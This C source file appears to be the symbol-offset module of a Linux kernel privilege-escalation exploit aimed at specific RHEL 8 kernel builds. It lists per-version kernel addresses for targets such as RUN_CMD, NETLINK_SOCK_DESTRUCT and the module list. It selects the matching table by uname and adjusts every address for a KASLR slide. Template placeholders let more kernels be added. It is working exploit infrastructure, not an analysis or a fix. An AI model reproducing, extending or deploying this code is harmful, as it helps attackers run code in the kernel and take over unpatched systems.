
#include "symbols.h"

#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct symbol_offset
{
	int is_address;
	uint64_t value;
};

struct kernel_symbols
{
	struct symbol_offset * symbols;
	uint64_t count;
	char * uname;
};

#define ARRAY_SIZE(ar) (sizeof(ar)/sizeof(ar[0]))

//The default kernel base that the symbols are based off of
#define DEFAULT_KERNEL_BASE 0xffffffff81000000UL
//The kernel base of the running system, which will be adjusted at runtime
uint64_t KERNEL_BASE = 0xffffffff81000000UL;

struct symbol_offset rhel_8_1_kernel_4_18_0_147_8_1_el8_1_symbols[] = {
	{ .is_address = 1, .value = 0xffffffff810d2500UL }, //PARAM_ARRAY_FREE
	{ .is_address = 1, .value = 0xffffffff81857910UL }, //MEMCPY
	{ .is_address = 1, .value = 0xffffffff810d64c0UL }, //RUN_CMD
	{ .is_address = 1, .value = 0xffffffff8174dc90UL }, //NETLINK_SOCK_DESTRUCT
	{ .is_address = 1, .value = 0xffffffff822b5070UL }, //MODULE_LIST_HEAD
	{ .is_address = 1, .value = 0xffffffff82a33378UL }, //MODULE_KSET
	{ .is_address = 1, .value = 0xffffffff8184ae70UL }, //SEQ_BUF_PUTMEM
	{ .is_address = 1, .value = 0xffffffff8184b090UL }, //SEQ_BUF_TO_USER
	{ .is_address = 0, .value = 0x340,               }, //MODULE_INFO_DIFF
	{ .is_address = 0, .value = 0x0,                 }, //MODULE_STATUS_OFFSET
	{ .is_address = 0, .value = 0x8,                 }, //MODULE_LIST_OFFSET
	{ .is_address = 0, .value = 0x58,                }, //MODULE_KOBJ_LIST_OFFSET
	{ .is_address = 0, .value = 0x328,               }, //MODULE_REFCNT_OFFSET
};

struct symbol_offset rhel_8_2_kernel_4_18_0_193_14_3_el8_2_symbols[] = {
	{ .is_address = 1, .value = 0xffffffff810d37f0UL }, //PARAM_ARRAY_FREE
	{ .is_address = 1, .value = 0xffffffff81883b20UL }, //MEMCPY
	{ .is_address = 1, .value = 0xffffffff810d78d0UL }, //RUN_CMD
	{ .is_address = 1, .value = 0xffffffff81775170UL }, //NETLINK_SOCK_DESTRUCT
	{ .is_address = 1, .value = 0xffffffff822adc30UL }, //MODULE_LIST_HEAD
	{ .is_address = 1, .value = 0xffffffff82c14378UL }, //MODULE_KSET
	{ .is_address = 1, .value = 0xffffffff81876850UL }, //SEQ_BUF_PUTMEM
	{ .is_address = 1, .value = 0xffffffff81876a70UL }, //SEQ_BUF_TO_USER
	{ .is_address = 0, .value = 0x340,               }, //MODULE_INFO_DIFF
	{ .is_address = 0, .value = 0x0,                 }, //MODULE_STATUS_OFFSET
	{ .is_address = 0, .value = 0x8,                 }, //MODULE_LIST_OFFSET
	{ .is_address = 0, .value = 0x58,                }, //MODULE_KOBJ_LIST_OFFSET
	{ .is_address = 0, .value = 0x328,               }, //MODULE_REFCNT_OFFSET
};

struct symbol_offset rhel_8_3_kernel_4_18_0_240_el8_symbols[] = {
	{ .is_address = 1, .value = 0xffffffff810d84f0UL }, //PARAM_ARRAY_FREE
	{ .is_address = 1, .value = 0xffffffff818c50c0UL }, //MEMCPY
	{ .is_address = 1, .value = 0xffffffff810dc610UL }, //RUN_CMD
	{ .is_address = 1, .value = 0xffffffff817a6230UL }, //NETLINK_SOCK_DESTRUCT
	{ .is_address = 1, .value = 0xffffffff822ab7b0UL }, //MODULE_LIST_HEAD
	{ .is_address = 1, .value = 0xffffffff82d563b8UL }, //MODULE_KSET
	{ .is_address = 1, .value = 0xffffffff818b7c00UL }, //SEQ_BUF_PUTMEM
	{ .is_address = 1, .value = 0xffffffff818b7e20UL }, //SEQ_BUF_TO_USER
	{ .is_address = 0, .value = 0x340,               }, //MODULE_INFO_DIFF
	{ .is_address = 0, .value = 0x0,                 }, //MODULE_STATUS_OFFSET
	{ .is_address = 0, .value = 0x8,                 }, //MODULE_LIST_OFFSET
	{ .is_address = 0, .value = 0x58,                }, //MODULE_KOBJ_LIST_OFFSET
	{ .is_address = 0, .value = 0x328,               }, //MODULE_REFCNT_OFFSET
};

struct symbol_offset rhel_8_3_kernel_4_18_0_240_10_1_el8_3_symbols[] = {
	{ .is_address = 1, .value = 0xffffffff810d84f0UL }, //PARAM_ARRAY_FREE
	{ .is_address = 1, .value = 0xffffffff818c6c90UL }, //MEMCPY
	{ .is_address = 1, .value = 0xffffffff810dc610UL }, //RUN_CMD
	{ .is_address = 1, .value = 0xffffffff817a7450UL }, //NETLINK_SOCK_DESTRUCT
	{ .is_address = 1, .value = 0xffffffff822ab7b0UL }, //MODULE_LIST_HEAD
	{ .is_address = 1, .value = 0xffffffff82d583b8UL }, //MODULE_KSET
	{ .is_address = 1, .value = 0xffffffff818b97d0UL }, //SEQ_BUF_PUTMEM
	{ .is_address = 1, .value = 0xffffffff818b99f0UL }, //SEQ_BUF_TO_USER
	{ .is_address = 0, .value = 0x340,               }, //MODULE_INFO_DIFF
	{ .is_address = 0, .value = 0x0,                 }, //MODULE_STATUS_OFFSET
	{ .is_address = 0, .value = 0x8,                 }, //MODULE_LIST_OFFSET
	{ .is_address = 0, .value = 0x58,                }, //MODULE_KOBJ_LIST_OFFSET
	{ .is_address = 0, .value = 0x328,               }, //MODULE_REFCNT_OFFSET
};

##ARR_SYMBOLS##

//The mapping of kernel versions to known symbols/offsets
struct kernel_symbols  all_kernel_symbols[] = {
	{ .symbols = rhel_8_1_kernel_4_18_0_147_8_1_el8_1_symbols,
		.count = ARRAY_SIZE(rhel_8_1_kernel_4_18_0_147_8_1_el8_1_symbols),
		.uname = "4.18.0-147.8.1.el8_1.x86_64" },
	{ .symbols = rhel_8_2_kernel_4_18_0_193_14_3_el8_2_symbols,
		.count = ARRAY_SIZE(rhel_8_2_kernel_4_18_0_193_14_3_el8_2_symbols),
		.uname = "4.18.0-193.14.3.el8_2.x86_64" },
	{ .symbols = rhel_8_3_kernel_4_18_0_240_el8_symbols,
		.count = ARRAY_SIZE(rhel_8_3_kernel_4_18_0_240_el8_symbols),
		.uname = "4.18.0-240.el8.x86_64" },
	{ .symbols = rhel_8_3_kernel_4_18_0_240_10_1_el8_3_symbols,
		.count = ARRAY_SIZE(rhel_8_3_kernel_4_18_0_240_10_1_el8_3_symbols),
		.uname = "4.18.0-240.10.1.el8_3.x86_64" },
		##ARR_ADD##
};

static struct kernel_symbols * current_kernel_symbols = NULL;

static void setup_symbols(void)
{
	char read_buffer[1024];
	int fd, i;

	system("uname -r > /tmp/uname");

	fd = open("/tmp/uname", O_RDONLY);
	if(fd < 0) {
		printf("Couldn't get kernel version\n");
		exit(1);
	}
	memset(read_buffer, 0, sizeof(read_buffer));
	if(read(fd, read_buffer, sizeof(read_buffer)) < 0) {
		printf("Couldn't get kernel version\n");
		exit(1);
	}
	if(read_buffer[0] != 0 && read_buffer[strlen(read_buffer)-1] == '\n')
		read_buffer[strlen(read_buffer)-1] = 0;
	close(fd);
	unlink("/tmp/uname");

	for(i = 0; i < ARRAY_SIZE(all_kernel_symbols); i++) {
		if(strcmp(all_kernel_symbols[i].uname, read_buffer) == 0) {
			current_kernel_symbols = &all_kernel_symbols[i];
		}
	}

	if(!current_kernel_symbols) {
		printf("Unknown uname for kernel symbols: %s\n", read_buffer);
		exit(1);
	}
	if(current_kernel_symbols->count != MAX_SYMBOLS_OFFSETS) {
		printf("Incorrect number of symbols struct for kernel %s (has %lu symbols, needs %d)\n",
			current_kernel_symbols->uname, current_kernel_symbols->count, MAX_SYMBOLS_OFFSETS);
		exit(1);
	}
}

uint64_t get_symbol_offset(enum SYMBOLS_OFFSETS symbol)
{
	if(!current_kernel_symbols)
		setup_symbols();

	if(current_kernel_symbols->symbols[symbol].is_address)
		return (current_kernel_symbols->symbols[symbol].value - DEFAULT_KERNEL_BASE) + KERNEL_BASE;
	return current_kernel_symbols->symbols[symbol].value;
}

uint64_t set_kernel_base(uint64_t kernel_base, uint64_t kernel_slide)
{
	if(kernel_base)
		KERNEL_BASE = kernel_base;
	else
		KERNEL_BASE = DEFAULT_KERNEL_BASE + kernel_slide;
	printf("KERNEL_BASE=0x%lx\n", KERNEL_BASE);
}
